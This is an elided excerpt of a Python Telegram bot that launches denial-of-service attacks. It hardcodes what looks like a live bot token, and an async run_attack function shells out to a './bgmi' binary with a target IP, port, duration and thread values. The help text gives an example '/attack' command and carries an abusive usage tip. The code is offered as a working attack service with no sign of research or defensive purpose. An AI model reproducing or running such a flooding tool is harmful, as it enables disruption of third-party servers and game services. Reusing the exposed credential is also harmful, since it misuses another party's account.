...
TELEGRAM_BOT_TOKEN = '7601607062:AAEdoIO1yRnSw7Xplofnb1I4UjhkO-_UJts'  # Replace with your bot token
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} {20} {900}"
...
async def help(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "   - *Example: /attack 192.168.1.1 20876 300*\n"
        ...
        "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
        "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SAMJHA CHUTIYE.*\n"
